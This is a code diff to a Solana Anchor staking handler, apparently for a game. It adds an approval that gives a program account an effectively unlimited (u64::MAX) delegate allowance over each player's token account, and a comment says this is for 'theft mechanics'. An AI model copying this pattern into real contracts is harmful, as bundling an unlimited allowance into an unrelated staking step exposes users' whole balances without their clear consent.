@@ -1,5 +1,5 @@
 use anchor_lang::prelude::*;
-use anchor_spl::token::{self, Token, TokenAccount, Transfer};
+use anchor_spl::token::{self, Token, TokenAccount, Transfer, Approve};
 use anchor_spl::associated_token::AssociatedToken;
 use crate::state::*;
 use crate::constants::*;
@@ -85,6 +85,18 @@ pub fn stake_handler(ctx: Context<StakeForParticipation>, amount: u64) -> Result
         },
     );
     token::transfer(transfer_ctx, amount)?;
+
+    // Approve the game_state PDA as delegate on player's DUMP account for theft mechanics
+    let approve_ctx = CpiContext::new(
+        ctx.accounts.token_program.to_account_info(),
+        Approve {
+            to: ctx.accounts.player_dump_account.to_account_info(),
+            delegate: ctx.accounts.game_state.to_account_info(),
+            authority: ctx.accounts.player.to_account_info(),
+        },
+    );
+    // Grant effectively unlimited allowance; can later be tuned or refreshed each epoch
+    token::approve(approve_ctx, u64::MAX)?;
 
     // Initialize player state if needed
     if player_state.player == Pubkey::default() {
